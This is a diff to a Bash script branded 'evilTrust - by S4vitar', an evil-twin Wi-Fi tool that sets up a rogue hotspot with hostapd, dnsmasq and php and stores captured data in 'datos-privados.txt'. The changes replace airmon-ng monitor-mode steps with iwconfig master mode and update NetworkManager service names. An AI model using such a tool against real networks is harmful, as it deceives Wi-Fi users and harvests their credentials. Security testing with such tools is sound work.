@@ -19,10 +19,8 @@ function ctrl_c(){
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
 	rm -r iface 2>/dev/null
 	find \-name datos-privados.txt | xargs rm 2>/dev/null
-	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
-	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
-	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
-	tput cnorm; service network-manager restart
+	sleep 3; killall php hostapd dnsmasq 2>/dev/null; sleep 1
+	tput cnorm; systemctl restart NetworkManager
 	exit 0
 }
 
@@ -87,14 +85,13 @@ function startAttack(){
 
 	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1
 
-	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
-	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
 	counter=1; for interface in $(cat iface); do
 		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
 		let counter++
 	done; tput cnorm
 	checker=0; while [ $checker -ne 1 ]; do
-		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface
+		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0): ${endColour}" && read choosed_interface
 
 		for interface in $(cat iface); do
 			if [ "$choosed_interface" == "$interface" ]; then
@@ -108,7 +105,7 @@ function startAttack(){
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
 	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
 	sleep 2
-	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+	killall NetworkManager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 	sleep 5
 
 	echo -e "interface=$choosed_interface\n" > hostapd.conf
@@ -245,7 +242,7 @@ function guiMode(){
         done
 
 	tput civis; whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
-	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"
+	tput civis; iwconfig $choosed_interface mode master > /dev/null 2>&1; choosed_interface="${choosed_interface}"
 
 	rm iface 2>/dev/null
 	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "evilTrust - by S4vitar" 3>&1 1>&2 2>&3)
@@ -270,7 +267,7 @@ function guiMode(){
 
 	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... (Este proceso tarda unos segundos)${endColour}"
         sleep 2
-        killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+        killall NetworkManager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
         sleep 5
 
         echo -e "interface=$choosed_interface\n" > hostapd.conf
